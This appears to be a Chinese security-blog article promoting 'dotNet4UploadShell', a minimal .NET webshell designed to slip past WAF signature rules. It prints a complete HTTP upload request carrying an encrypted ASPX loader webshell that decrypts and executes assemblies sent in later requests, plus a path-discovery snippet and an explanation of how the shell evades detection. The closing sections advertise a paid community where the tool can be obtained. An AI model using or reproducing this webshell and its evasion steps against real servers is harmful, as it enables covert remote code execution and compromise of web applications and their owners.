---
title: .NET 一款体积极小用于规避WAF的Shell
url: https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247494748&idx=3&sn=659c8a26a166e96337134b009a4e56c4&chksm=fa5942b1cd2ecba7a1c600fd95b54088cbce08639c45c0341aac622391a53543e63096af3c4d&scene=58&subscene=0#rd
source: dotNet安全矩阵
date: 2024-08-26
fetch_date: 2025-10-06T18:02:20.258825
---

# .NET 一款体积极小用于规避WAF的Shell

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibD0AylQA7p8SW8F2btc5jIt31BrKQQweh6XMN05sNxC2iaY88SL422VzuFIUbnlIsibZLcMoiaib1L3A/0?wx_fmt=jpeg)

# .NET 一款体积极小用于规避WAF的Shell

原创

专攻.NET安全的

dotNet安全矩阵

01

阅读须知

此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他方面

02

基本介绍

dotNet4UploadShell 是一个极小的 .NET Shell，仅由 32 个字符组成。由于其紧凑的特性，它能够有效地规避基于签名的检测机制。传统的 .NET Shell 通常包含诸如 Page language="c#" 这样的头部声明，WAF 和其他安全工具可以轻松检测并阻止这些声明。而 dotNet4UploadShell 则省略了这些头部声明，使其更难以被察觉。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibD0AylQA7p8SW8F2btc5jIqQAPvg1f6zN8a6PSfmXkQ5EhSI3NlicVX5YA88jic6kMLTiaEdcfhREJg/640?wx_fmt=jpeg&from=appmsg)

03

使用方法

为了演示该工具的用法，Shell 接受一个文件上传，并将上传文件的内容读取到一个字符串中，然后可以进一步处理或写入磁盘。此处重要需要指定参数 "1"，指向一个绝对路径，发送如下HTTP请求即可上传任意文件，如下所示。

```
POST /UploadFile/dotNet4UploadShell.aspx HTTP/1.1
Content-Length: 3000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9zyASX3Znm0vvlGV
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.81 Safari/537.36 SE 2.X MetaSr 1.0
Cookie: ASP.NET_SessionId=4gv3r2uxworineir5m0ydr45
Connection: close

------WebKitFormBoundary9zyASX3Znm0vvlGV
Content-Disposition: form-data; name="FileInfo"; filename="1.aspx"

<%@ Page Language="C#"%><%try { string key = "3c6e0b8a9c15224a"; string pass = "123"; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace("-", ""); byte[] data = System.Convert.FromBase64String(Context.Request[pass]); data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); if (Context.Session["payload"] == null) { Context.Session["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data }); ; } else { System.IO.MemoryStream outStream = new System.IO.MemoryStream(); object o = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY"); o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString(); byte[] r = outStream.ToArray(); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16)); } } catch (System.Exception) { }
%>
Content-Disposition: form-data; name="1"

D:\wwwroot\UploadFile\1234.aspx
------WebKitFormBoundary9zyASX3Znm0vvlGV--
```

通过一个HTTP POST请求，上传了一个名为1.aspx的文件到服务器。这个文件实际上就是一个“小马”，其主要功能是解密并加载一个隐藏在HTTP请求中的“大马”。

04

原理解析

dotNet4UploadShell 通过不包含典型的 .NET 头部声明（如 Page language="c#"），这个 Shell 不会触发 WAF 规则。Shell 通过 Request.Files 接受一个文件上传一旦这个 Shell 上传并在目标系统上执行，

## 4.1 获取绝对路径

在第一步获取服务器上 Web 应用程序的绝对路径。这对于后续的攻击步骤至关重要。

```
<%=Server.MapPath("./")%>
```

通过 Server.MapPath 方法将相对路径（在这个例子中是 "./"，即当前目录）转换为服务器上的物理路径，会返回类似如下的物理路径：

```
C:\inetpub\wwwroot\YourWebApp\
```

## 4.2 小马带大马

接着，上传dotNet4UploadShell ，再请求方法是POST，目标路径是/UploadFile/dotNet4UploadShell.aspx，请求体使用multipart/form-data格式，分为多个部分，其中最重要的是以下两部分

```
------WebKitFormBoundary9zyASX3Znm0vvlGV
Content-Disposition: form-data; name="FileInfo"; filename="1.aspx"

<%免杀的.NET代码%>
```

这部分是实际上传的文件内容，即“小马”脚本。它包含C#代码，用于执行更复杂的操作。随后，可能通过来指定参数1，上传文件的保存路径或其他参数。

```
Content-Disposition: form-data; name="1"

D:\wwwroot\UploadFile\1234.aspx
```

在这种情况下，上传的“小马”不直接包含大量复杂的功能，而是专注于加载一个隐藏在请求中的更大的有效负载（即“大马”）从而进一步渗透目标系统。工具已经打包在星球，感兴趣的朋友可以加入自取。

05

推荐阅读

从漏洞分析到安全攻防，我们涵盖了.NET安全各个关键方面，为您呈现最新、最全面的.NET安全知识，下面是公众号发布的精华文章集合，推荐大家阅读！

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8TQhCZMggf71ffibqISJ8f5naPJacnjn0roDyxxnAibmuwDJq2p1GTBpicZhnM9o9gTIu9S9ia8Uqwtw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247493952&idx=4&sn=db68011fb075c1d02268811163646b53&chksm=fa5947adcd2ecebbb1ca6659f289a5e344e37d1136fe0bd9272b5578e4c71bb19bb250e934d3&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8TQhCZMggf71ffibqISJ8f5jtGD7iaMnQxKfLfibIwMQP6vlheBicOeYPibv4Nu5fxtEibLibdJSW8HPp7w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247493952&idx=3&sn=88060c78ccd74089bfe67682e79497d8&chksm=fa5947adcd2ecebbe09ba231b44c9574b5cc88f6d8e934989e3953856301fa071ae39aa827d6&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOE2ogFoYIdqnYynqF6XyicI7XfRsWsn36wsCpKpAJcIQOicZUhbDJOe0w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247488762&idx=1&sn=a5710927a6ba09b5c83adf616e2b12ae&chksm=fa5aba17cd2d330119d1ab2ce4b3a434274f0adf96729dbf8f04bef16c389565fc144f84d341&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOeP3ichLEiafhGiawd8mjkHYBalO37fN8QQkNdic1hjjY2Nvw2Bib6UvibDRA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490722&idx=2&sn=c9807daa5548e139a0c67303cb26882a&chksm=fa5ab24fcd2d3b59a85be03e69c655ffd644e8458bc2ec3f572da4b40b43e5003fda756f35b4&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOjWgak8cI7Mic1wTt3YSKqsbLl9rPe0cF9WGtOEuiceLreTNtNVib6IKlw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490703&idx=2&sn=e7db1ff662e5b41d9a1806fbdf33e204&chksm=fa5ab262cd2d3b7470f029b9a07d1dd3611e63be910b01a601144efe7d84b5f016f488a354cf&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxO8jJ97qqWlY6XR03DqSnutcHFYibDtVG5Y2wEaK4p2bzEicZblY4oQyGg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490700&idx=2&sn=e8a865ada7c743e77fb9e953c5da74b1&chksm=fa5ab261cd2d3b7736387eddfc8524a378a1604552d0c9b55476646f9e8275f48818aab8acad&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOe1viaia4aoFceunsUdIna4DPbmemW1EqlBMrovOoE6bdAFF3iaApxz5qA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247488736&idx=2&sn=d24aaa297c51eb620ccdf67af513086d&chksm=fa5aba0dcd2d331bbb22f3f5657199d718c90efed42fcb9cb67ec23d342f887c117e4858f1cb&scene=21#wechat_redirect)

06

欢迎加入.NET安全星球

为了更好地应对基于.NET技术栈的风险识别和未知威胁，dotNet安全矩阵星球从创建以来一直聚焦于.NET领域的安全攻防技术，定位于高质量安全攻防星球社区，也得到了许多师傅们的支持和信任，通过星球深度连接入圈的师傅们，一起推动.NET安全高质量的向前发展。 星球门票后期价格随着内容和质量的不断沉淀会适当提高，因此越早加入越好！

    目前dot.Net安全矩阵星球已成为中国.NET安全领域最知名、最活跃的技术知识库之一，从.NET Framework到.NET Core，从Web应用到PC端软件应用，无论您是初学者还是经验丰富的开发人员，都能在这里找到对应的安全指南和最佳实践。

星球汇聚了各行业安全攻防技术大咖，并且每日分享.NET安全技术干货以及交流解答各类技术等问题，社区中发布很多高质量的.NET安全资源，可以说市面上很少见，都是干货。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibzerwUbGOupPoJgYlZNMo1gg58eGoicPibjMBKkEo1zOia6zOyeupYasZZ9DTFvJVvzJQTEuhKrvTsA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8DlZsGiaRRGghficKFQt58Ueoynsb0my3uzMAb7VwM5bgtnb4nbl4c9xdEjGraUXic6pO0p38xmWiaRQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOc2SogKzZ16SD7dpzF3v81kia4ZAx5QU5ibnNibEo8kZZSJgrficz4Ckxwg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

星球文化始终认为授人以鱼不如授人以渔！加入星球后可以跟星主和嘉宾们一对一提问交流，20+个专题栏目涵盖了点、线、面、体等知识面，助力师傅们快速成长！其中主题包括.NET Tricks、漏洞分析、内存马、代码审计、预编译、反序列化、webshell免杀、命令执行、C#工具库等等。![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YiccvW0LwqSx3grm4bgM0fz01qCxrYGBR94wibZ7sk1zIO9DzCgviab9vmUic8qmvynXhSM8LxFhGG97w/640?wx_fmt=other&from=ap...